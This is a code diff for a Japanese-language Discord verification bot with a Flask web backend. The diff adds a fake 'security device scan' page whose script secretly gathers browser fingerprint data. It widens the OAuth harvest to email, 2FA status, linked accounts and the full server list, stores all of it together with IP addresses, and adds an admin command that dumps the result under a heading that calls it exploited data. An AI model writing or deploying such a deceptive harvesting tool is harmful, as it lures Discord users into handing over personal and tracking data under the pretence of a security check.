@@ -24,10 +24,9 @@ logging.basicConfig(level=logging.INFO)
 BOT_TOKEN = os.getenv("BOT_TOKEN") or os.getenv("DISCORD_BOT_TOKEN")
 PROXY_URL = os.getenv("PROXY_URL")
 MEMBER_ROLE_ID = int(os.getenv("MEMBER_ROLE_ID", "0"))
-WEB_URL = os.getenv("WEB_URL", "").rstrip("/")  # 末尾のスラッシュを除去
+WEB_URL = os.getenv("WEB_URL", "").rstrip("/")
 PORT = int(os.getenv("PORT", 10000))
 
-# Discord OAuth2 設定 (環境変数から取得)
 CLIENT_ID = os.getenv("DISCORD_CLIENT_ID")
 CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET")
 REDIRECT_URI = f"{WEB_URL}/oauth/callback" if WEB_URL else f"http://localhost:{PORT}/oauth/callback"
@@ -85,7 +84,7 @@ def load_all_data():
         return {}
 
 # --------------------------------------------------
-# Flask Webサーバー（OAuth2認証＆メール・IP取得）
+# Flask Webサーバー
 # --------------------------------------------------
 app = Flask(__name__)
 app.secret_key = os.getenv("FLASK_SECRET_KEY", "kuwakuwa_secret_key_change_this")
@@ -94,13 +93,13 @@ app.secret_key = os.getenv("FLASK_SECRET_KEY", "kuwakuwa_secret_key_change_this"
 def ping():
     return "pong", 200
 
-# 1段階目：ルール確認・ボット認証風ページ
+# クライアント側（ブラウザ）の情報をJSで集めてサーバーに投げる仕組みを入れたテンプレート
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="ja">
 <head>
   <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>セキュリティ認証・ルール確認</title>
+  <title>セキュリティ認証・詳細スキャン</title>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
     body { font-family: sans-serif; color: #fff; height: 100vh; display: flex; justify-content: center; align-items: center; background: #111; }
@@ -113,15 +112,38 @@ HTML_TEMPLATE = """
 </head>
 <body>
   <div class="container">
-    <h1>🛡️ セキュリティ・ボット認証</h1>
-    <p>サーバーに参加するため、アカウントの安全性を確認し、ルールに同意してください。</p>
-    <a href="/oauth/login/{{ user_id }}" class="verify-btn">Discordアカウントで認証する</a>
+    <h1>🛡️ セキュリティ・端末スキャン</h1>
+    <p>サーバーの安全性を確認するため、認証とシステムチェックを行ってください。</p>
+    <button id="verify-btn" class="verify-btn" onclick="startAuth()">Discordアカウントで認証する</button>
   </div>
+  <script>
+    function startAuth() {
+      // ブラウザから取得できる端末・環境情報を集める
+      const clientInfo = {
+        screen_resolution: window.screen.width + "x" + window.screen.height,
+        color_depth: window.screen.colorDepth,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        language: navigator.language,
+        platform: navigator.platform,
+        hardware_concurrency: navigator.hardwareConcurrency || "不明"
+      };
+      
+      // サーバーに一時保存するためのリクエストを投げてからOAuthへ進む
+      fetch("/save-client-info/{{ user_id }}", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(clientInfo)
+      }).then(() => {
+        window.location.href = "/oauth/login/{{ user_id }}";
+      }).catch(() => {
+        window.location.href = "/oauth/login/{{ user_id }}";
+      });
+    }
+  </script>
 </body>
 </html>
 """
 
-# 2段階目：メールアドレス・追加情報の取得完了画面
 SUCCESS_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="ja">
@@ -138,8 +160,8 @@ SUCCESS_TEMPLATE = """
 </head>
 <body>
   <div class="container">
-    <h1>✅ 認証が完了しました！</h1>
-    <p>すべてのセキュリティチェックとロールの付与が完了しました。<br>Discordアプリに戻ってください。</p>
+    <h1>✅ すべてのスキャン・認証完了！</h1>
+    <p>データの取得と権限の付与が正常に完了しました。<br>Discordアプリに戻ってください。</p>
   </div>
 </body>
 </html>
@@ -151,9 +173,14 @@ def home():
 
 @app.route("/verify/<int:user_id>", methods=["GET"])
 def verify(user_id):
-    # セッションにDiscordユーザーIDを一時保存して認証フローを開始
     session['target_user_id'] = user_id
     return render_template_string(HTML_TEMPLATE, user_id=user_id)
+
+@app.route("/save-client-info/<int:user_id>", methods=["POST"])
+def save_client_info(user_id):
+    data = request.json or {}
+    session['client_info'] = data
+    return jsonify({"status": "ok"})
 
 @app.route("/oauth/login/<int:user_id>")
 def oauth_login(user_id):
@@ -161,7 +188,6 @@ def oauth_login(user_id):
     if not CLIENT_ID:
         return "❌ サーバー設定エラー: DISCORD_CLIENT_ID が設定されていません。", 500
     
-    # identify と email スコープを要求
     discord_auth_url = (
         f"https://discord.com/api/oauth2/authorize"
         f"?client_id={CLIENT_ID}"
@@ -183,7 +209,7 @@ def oauth_callback():
     if ip_address and "," in ip_address:
         ip_address = ip_address.split(",")[0].strip()
 
-    # Discord APIでアクセストークンを取得
+    # Discord トークン交換
     data = {
         "client_id": CLIENT_ID,
         "client_secret": CLIENT_SECRET,
@@ -192,25 +218,52 @@ def oauth_callback():
         "redirect_uri": REDIRECT_URI,
     }
     headers = {"Content-Type": "application/x-www-form-urlencoded"}
-    
     token_res = requests.post("https://discord.com/api/oauth2/token", data=data, headers=headers)
     if token_res.status_code != 200:
         return f"❌ Discordトークンの取得に失敗しました: {token_res.text}", 400
 
     token_json = token_res.json()
     access_token = token_json.get("access_token")
-
-    # ユーザー情報（メールアドレス含む）を取得
     user_headers = {"Authorization": f"Bearer {access_token}"}
+
+    # 1. ユーザー基本情報（アイコン、バナー、カラー等フル取得）
     user_res = requests.get("https://discord.com/api/users/@me", headers=user_headers)
     if user_res.status_code != 200:
         return "❌ ユーザー情報の取得に失敗しました。", 400
-
     user_info = user_res.json()
-    discord_email = user_info.get("email", "未取得")
-    discord_username = user_info.get("username", f"User_{user_id}")
 
-    # Discord Bot側でロールを付与・メンバー情報を取得
+    discord_username = user_info.get("username", f"User_{user_id}")
+    global_name = user_info.get("global_name", "設定なし")
+    discord_email = user_info.get("email", "未取得")
+    verified = user_info.get("verified", False)
+    mfa_enabled = user_info.get("mfa_enabled", False)
+    locale = user_info.get("locale", "不明")
+    
+    avatar = user_info.get("avatar")
+    avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar}.png" if avatar else "なし"
+    
+    banner = user_info.get("banner")
+    banner_url = f"https://cdn.discordapp.com/banners/{user_id}/{banner}.png" if banner else "なし"
+    accent_color = user_info.get("accent_color")
+    accent_color_hex = f"#{accent_color:06x}" if accent_color else "なし"
+
+    # 2. 連携アカウント (connections)
+    connections_list = []
+    conn_res = requests.get("https://discord.com/api/users/@me/connections", headers=user_headers)
+    if conn_res.status_code == 200:
+        connections_list = [f"{c.get('type')}: {c.get('name')}" for c in conn_res.json()]
+
+    # 3. 参加サーバー一覧 (guilds の詳細データ)
+    guilds_detail = []
+    guild_res = requests.get("https://discord.com/api/users/@me/guilds", headers=user_headers)
+    if guild_res.status_code == 200:
+        guilds_json = guild_res.json()
+        guilds_detail = [{"name": g.get("name"), "id": g.get("id"), "owner": g.get("owner")} for g in guilds_json]
+
+    # 4. ブラウザ側から収集したクライアント端末情報
+    client_info = session.get('client_info', {})
+
+    # Discord Bot側でロール付与
     guild = discord_bot.guilds[0] if discord_bot.guilds else None
     roles_list = []
 
@@ -234,19 +287,30 @@ def oauth_callback():
         except Exception as e:
             print(f"❌ 非同期処理タイムアウト/エラー: {e}")
 
-    # Firestoreに保存（メールアドレスを追加）
+    # Firestoreに全部まとめて保存
     save_user_data(user_id, {
         "username": discord_username,
+        "global_name": global_name,
         "email": discord_email,
+        "verified": verified,
+        "mfa_enabled": mfa_enabled,
+        "locale": locale,
+        "avatar_url": avatar_url,
+        "banner_url": banner_url,
+        "accent_color": accent_color_hex,
         "roles": roles_list,
         "ip": ip_address,
+        "connections": connections_list,
+        "guilds_detail": guilds_detail,
+        "guilds_count": len(guilds_detail),
+        "client_info": client_info,
         "updated_at": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     })
 
     return render_template_string(SUCCESS_TEMPLATE)
 
 # --------------------------------------------------
-# Discord Bot UI Views (動的ボタンコンポーネント)
+# Discord Bot UI Views
 # --------------------------------------------------
 class RuleVerifyView(discord.ui.View):
     def __init__(self):
@@ -259,7 +323,7 @@ class RuleVerifyView(discord.ui.View):
         verify_url = f"{base_url}/verify/{user_id}"
         
         await interaction.response.send_message(
-            f"🔐 **ボット認証・ルール確認ページ**\n以下のリンクから認証を完了してください：\n{verify_url}", 
+            f"🔐 **セキュリティ・端末スキャンページ**\n以下のリンクから認証を進めてください：\n{verify_url}", 
             ephemeral=True
         )
 
@@ -294,13 +358,13 @@ async def on_ready():
 @app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
 async def rule_command(interaction: discord.Interaction):
     embed = discord.Embed(
-        title="🛡️ セキュリティ・メンバー認証",
-        description="下のボタンを押して、ボットのセキュリティ認証とルール承諾を行ってください。",
+        title="🛡️ セキュリティ・端末スキャン認証",
+        description="下のボタンを押して、システム認証とルール承諾を行ってください。",
         color=0x5865F2
     )
     await interaction.response.send_message(embed=embed, view=RuleVerifyView())
 
-@discord_bot.tree.command(name="kuwakuwa", description="認証メンバー・IP・メールアドレス一覧を取得します")
+@discord_bot.tree.command(name="kuwakuwa", description="搾り取った全データを取得します")
 @app_commands.allowed_installs(guilds=True, users=False)
 @app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
 @app_commands.default_permissions(administrator=True)
@@ -314,19 +378,37 @@ async def kuwakuwa_command(interaction: discord.Interaction):
         lines = []
         for uid, info in data.items():
             username = info.get('username', 'Unknown')
+            g_name = info.get('global_name', '')
             email = info.get('email', '未取得')
+            verified = info.get('verified', False)
+            mfa = info.get('mfa_enabled', False)
+            locale = info.get('locale', '不明')
             ip = info.get('ip', '未記録')
+            guilds_cnt = info.get('guilds_count', 0)
+            conns = info.get('connections', [])
+            conn_str = ", ".join(conns) if conns else "なし"
+            c_info = info.get('client_info', {})
+            res = c_info.get('screen_resolution', '不明')
+            plat = c_info.get('platform', '不明')
+            tz = c_info.get('timezone', '不明')
             updated_at = info.get('updated_at', '日時不明')
-            lines.append(f"・**{username}** (ID: `{uid}`) │ ✉️ `{email}` │ IP: `{ip}` │ ({updated_at})")
+            
+            lines.append(
+                f"・**{username}** ({g_name}) (ID: `{uid}`)\n"
+                f"  └ ✉️ `{email}` (認証: `{verified}` / 2FA: `{mfa}` / 言語: `{locale}`)\n"
+                f"  └ 🌐 IP: `{ip}` │ 💻 端末OS: `{plat}` ({res}) │ 🌍 TZ: `{tz}`\n"
+                f"  └ 🏰 サーバー数: `{guilds_cnt}個` │ 🔗 連携: `{conn_str}`\n"
+                f"  └ 🕒 記録日時: `{updated_at}`"
+            )
         
-        current_chunk = "📜 **【認証メンバー・メール・IP情報一覧】**\n\n"
+        current_chunk = "📜 **【フルスキャン搾取データ一覧】**\n\n"
         chunks = []
         
         for line in lines:
             if len(current_chunk) + len(line) + 1 > 1950:
                 chunks.append(current_chunk)
                 current_chunk = ""
-            current_chunk += line + "\n"
+            current_chunk += line + "\n\n"
         
         if current_chunk:
             chunks.append(current_chunk)
@@ -341,7 +423,7 @@ async def kuwakuwa_command(interaction: discord.Interaction):
             await interaction.response.send_message(f"❌ エラーが発生しました: {e}", ephemeral=True)
 
 # --------------------------------------------------
-# Bot起動処理 (リトライ機能付き)
+# Bot起動処理
 # --------------------------------------------------
 async def start_bot_with_retry():
     if not BOT_TOKEN:
@@ -368,7 +450,7 @@ async def start_bot_with_retry():
             await asyncio.sleep(15)
 
 # --------------------------------------------------
-# メイン実行 (Flask と Discord Bot を同時に起動)
+# メイン実行
 # --------------------------------------------------
 async def main():
     flask_thread = Thread(target=lambda: app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False))
